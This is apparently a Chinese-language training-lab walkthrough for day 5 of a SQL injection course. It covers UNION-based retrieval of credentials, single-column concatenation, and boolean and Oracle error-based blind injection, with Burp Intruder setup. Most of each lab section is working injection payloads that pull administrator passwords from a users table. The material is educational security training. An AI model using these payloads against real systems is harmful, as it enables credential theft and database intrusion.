# Day 5 · UNION 取数据与布尔盲注（3 h）

> 目标：把 UNION 的最后两种形态打完（跨表取数、单列拼接），然后进入盲注——**页面不再给你数据，只给你一个比特**。
> 心态切换：从今天起，"一次请求拿一条记录"变成"一次请求拿一个字符"，甚至"一次请求拿一个比特"。工具开始比手速重要。

## 时间轴

| 时段 | 内容 | 产出 |
|------|------|------|
| 00:00–00:35 | Lab 17 跨表取 users 数据 | 登录 administrator |
| 00:35–01:05 | Lab 18 单列拼接多值 | `\|\|` / `CONCAT` |
| 01:05–01:50 | Lab 19 条件响应盲注 | 第一个字符 |
| 01:50–02:30 | Lab 20 条件错误盲注（Oracle） | 500 作为信号 |
| 02:30–03:00 | Intruder 流水线调优 + 笔记 | 可复用配置 |

---

## Lab 17 · UNION attack, retrieving data from other tables（Practitioner / 35 min）

### 一句话
列数对齐后，`UNION SELECT username, password FROM users` 直接把账号表打进页面。

### 观察
- 注入点 `category`，本 lab **2 列**。
- 第 2 列是字符列。
- 目标：登录 `administrator`。

### 攻击
```
/filter?category=Gifts' UNION SELECT username, password FROM users--
```

页面把每条 `username / password` 当成"产品名 / 描述"渲染出来。拿到 administrator 的密码 → 登录 → Solved。

### 为什么有效
`UNION` 只是把两个结果集纵向拼接，权限上没有任何隔离——只要应用账号能读 `users` 表，注入点就能读。这就是"SQL 注入 = 数据库全泄露"的直接原因。

### 坑
- 列数不对会报错，别急着换 payload，先回去 `ORDER BY`。
- 某些实例的 `users` 表只有 `username`、`password` 两列，但有 `id` 之类的数字列时，`UNION` 会把数字列渲染成空——不影响取数。

### 带走
**"有回显 + 知道表名" = 数据直接到手，不需要任何技巧。** 真实目标里 90% 的高危 SQLi 报告就停在这一步。

---

## Lab 18 · UNION attack, retrieving multiple values in a single column（Practitioner / 30 min）

### 一句话
只有一列能回显时，用字符串拼接把两个值合成一个字符串塞进去。

### 观察
还是 2 列，但只有 1 列显示字符串。直接 `SELECT username, password` 会有一列被丢弃。

### 攻击

Oracle / PostgreSQL（本 lab）：
```
/filter?category=Gifts' UNION SELECT NULL, username||'~'||password FROM users--
```

MySQL：
```
/filter?category=Gifts' UNION SELECT NULL, CONCAT(username,'~',password) FROM users--
```

MSSQL：
```
/filter?category=Gifts' UNION SELECT NULL, username+':'+password FROM users--
```

页面显示 `administrator~<密码>`，用 `~` 分隔，方便肉眼切分。

### 为什么有效
拼接把两个字段变成一个字符串值，仍然满足"1 个列"的约束。分隔符的作用是防止 `ab` + `cd` 和 `a` + `bcd` 这种歧义（真实数据里用户名和密码都可能含字母）。

### 坑
- **拼接符选错是唯一的坑**：`||` 在 MySQL 默认被当逻辑或（除非 `PIPES_AS_CONCAT`），结果变成 `0` 或 `1`。看到回显是 `0`/`1` 就立刻换 `CONCAT()`。
- Oracle 里 `NULL` 参与 `||` 拼接会得到原串，没问题；但 `username||NULL` 不会报错，别指望靠 NULL 判断。
- 分隔符别用 `-`、`:` 这类可能出现在密码里的字符（其实都行，但 `~` 更少见）。

### 带走
"只剩一列"不是死路。**先拼接，再考虑 `GROUP_CONCAT` / `string_agg` 一次性把多行也合并。**

---

## 盲注的心智模型

从这里开始，页面上没有数据了。你只有一个**布尔信号**：

> 条件为真 → 页面出现 "Welcome back"；条件为假 → 不出现。

于是提取数据的公式是：

```
对第 i 个字符，遍历字符表 c：
    SUBSTRING((SELECT password FROM users WHERE username='administrator'), i, 1) = c
    为真 → 该字符就是 c
```

26 小写 + 10 数字 = 36 次/字符，20 位密码 = 720 次请求。听着多，但 Intruder 跑完只要几十秒。

### Intruder 流水线（本 day 的核心生产力）

1. 抓一个带 `TrackingId` cookie 的请求 → `Send to Intruder`。
2. 攻击类型 **Sniper**，payload 位置标在 `TrackingId=xyz' AND SUBSTRING(...)='§a§`。
3. Payloads → Simple list：`a`–`z`、`0`–`9`。
4. Settings → **Grep - Match** 加 `Welcome back`（或看 `Status` / `Length`）。
5. Start attack → 按 `Welcome back` 列排序 → 命中的那一行就是正确字符。
6. 改 `SUBSTRING(...,i,1)` 的 `i`，重复。

> Community 版 Intruder 有速率限制（约 1 req/s），720 次 ≈ 12 分钟。想快就上 Pro，或者自己写 Python 脚本（`requests` + 单线程循环），逻辑和 Intruder 完全一样。

---

## Lab 19 · Blind SQLi with conditional responses（Practitioner / 45 min）

### 一句话
用 `AND` 挂一个布尔条件，靠 "Welcome back" 有无来判断真假。

### 观察
- 请求带 `Cookie: TrackingId=<随机串>`。
- 页面顶部有 `Welcome back!` 字样（说明 cookie 被识别）。
- 改 cookie 为一个不存在的值 → "Welcome back" 消失。

### 攻击

**Step 1：确认布尔通道**
```
TrackingId=xyz' AND '1'='1     → 出现 Welcome back
TrackingId=xyz' AND '1'='2     → 消失
```

**Step 2：确认能读到 users 表**
```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```
出现 → 表名/用户名正确。

**Step 3：逐字符提取**
```
TrackingId=xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a
```
注意结尾**没有闭合引号**也能工作：原查询是 `WHERE TrackingId = 'xyz' AND SUBSTRING(...)='a'`，后面剩一个 `'` 会让语法错……所以实际写法是：

```
TrackingId=xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a
```

如果报错（500），就补注释：`...='a'--`。本 lab 两条都能通，取决于服务端是否容错。

**Step 4：Intruder 跑完 20 个字符**，拿到密码 → 登录 administrator → Solved。

### 为什么有效
盲注的本质是"把数据库变成一个只能回答 yes/no 的预言机"。`SUBSTRING(...)=c` 把"第 i 个字符是不是 c"编码成一次布尔查询，应用把查询结果映射成"有没有这条记录"，于是这个比特被你读到。

### 坑
- **第一次一定要先验证 `' AND '1'='1` 有差异**，否则后面全是白跑。若两条都没差异，说明这个点不是布尔盲注（走 Lab 20 的错误信号）。
- `SUBSTRING` 在部分库叫 `SUBSTR`，MySQL 两个都认。
- 大小写：密码里可能有大写字母，payload 列表要加 `A`–`Z`；本 lab 通常是小写+数字。
- Community 版限速下别用 500 线程，容易被 WAF/限流打断。

### 带走
**盲注第一步不是写 payload，是找到"稳定可复现的二值信号"。** 找到了，剩下的就是循环。

---

## Lab 20 · Blind SQLi with conditional errors（Practitioner / 45 min）

### 一句话
页面内容不随布尔条件变化，但**报错会变**——条件为真时故意制造除零错误，让响应变成 500。

### 观察
- 同样的 `TrackingId` 注入点。
- `' AND '1'='1` / `' AND '1'='2` → 页面**完全一样**，布尔通道死了。
- 但 `'` 单个引号 → 500。说明报错会反映到 HTTP 状态码。

### 攻击

**Step 1：确认条件错误通道（Oracle）**
```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
→ 500（除零）

```
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
→ 200（走 ELSE，返回空串）

**Step 2：换成真实条件**
```
TrackingId=xyz'||(SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1))='a' THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
真 → 500；假 → 200。

**Step 3：Intruder 遍历字符**，判定列用 `Status`（500 命中），拿完密码登录 → Solved。

### 为什么有效
`CASE WHEN 条件 THEN TO_CHAR(1/0) ELSE '' END` 把"条件的真假"翻译成"是否除零"。Oracle 的 `1/0` 会抛 `ORA-01476: divisor is equal to zero`，应用没捕获 → 500。于是一个**错误页**变成了你的比特通道。

### 坑
- **必须把 `1/0` 包进 `TO_CHAR()`**：直接 `THEN 1/0` 在某些驱动/优化下不会真的求值，或者被延迟求值，导致永远不报错。
- 拼接上下文不同，payload 形态不同：本 lab 的 `TrackingId` 被拼进 `WHERE TrackingId = '...'`，所以用 `'||(...)||'` 闭合；如果上下文是 `AND`，就用 `' AND (SELECT ... )='a`。
- Intruder 判定别用 `Length`（500 页面长度可能和 200 接近），直接看 `Status` 列。
- 报错页可能被应用包了一层"友好错误页"但仍是 500——以状态码为准。

### 带走
三种盲注信号按"成本"排序，**优先用便宜的那个**：

| 信号 | 成本 | 适用 |
|------|------|------|
| 布尔内容差异 | 1 请求/字符 | 页面有可观测差异 |
| 报错差异 | 1 请求/字符 | 内容无差异但错误会外泄 |
| 时间延迟 | 1 请求/字符 × 延迟秒数 | 上面都不行（Day 6） |
| OOB | 1 请求/字符（异步） | 连时间都测不准（Day 6） |

---

## 当日复盘

### 四种 UNION 形态

| 情形 | 手法 | Lab |
|------|------|-----|
| 多列可回显 | `UNION SELECT a,b FROM t` | 17 |
| 只有一列可回显 | `a\|\|'~'\|\|b` / `CONCAT` | 18 |
| 无回显但有布尔差异 | `AND SUBSTRING(...)=c` | 19 |
| 无回显且无布尔差异 | `CASE WHEN ... THEN 1/0` | 20 |

### 三个问题自测
1. Lab 18 里为什么必须加分隔符 `~`？
2. Lab 19 第一步为什么要先验证 `' AND '1'='1` 与 `' AND '1'='2`？
3. Lab 20 为什么 `THEN 1/0` 要包 `TO_CHAR()`？不包会怎样？

### 明日预告
Day 6 是"最慢也最硬"的一天：时间盲注（PostgreSQL 的 `pg_sleep`）和带外（Oracle 的 `EXTRACTVALUE` + XXE）。当天要开 Burp Collaborator 或 `interactsh`，并且要习惯"一次请求等 10 秒"的节奏。
